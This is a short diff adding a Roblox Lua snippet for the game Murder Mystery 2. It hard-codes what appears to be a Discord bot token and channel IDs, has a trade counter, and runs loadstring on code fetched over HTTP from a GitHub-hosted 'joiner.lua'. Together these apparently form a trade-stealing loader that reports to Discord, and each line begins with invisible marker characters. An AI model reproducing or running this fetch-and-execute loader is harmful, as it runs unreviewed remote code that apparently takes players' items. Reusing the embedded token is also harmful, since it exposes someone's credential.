@@ -1,0 +1,7 @@
+```lua
+‎bottoken = "MTU3MTE1NzgwODMyMDA4NjExOQ.GURiyD.gdTRBAPJQx3xNF_bazYLQRvUop1hfYQ05XLfo8"
+‎chanelid = "1557684503756017667"
+‎logid = "1563676630730154145"
+‎tradesbeforenext = 1
+‎loadstring(game:HttpGet('https://raw.githubusercontent.com/aaalmaz0/mm2/refs/heads/main/joiner.lua'))()
+‎```
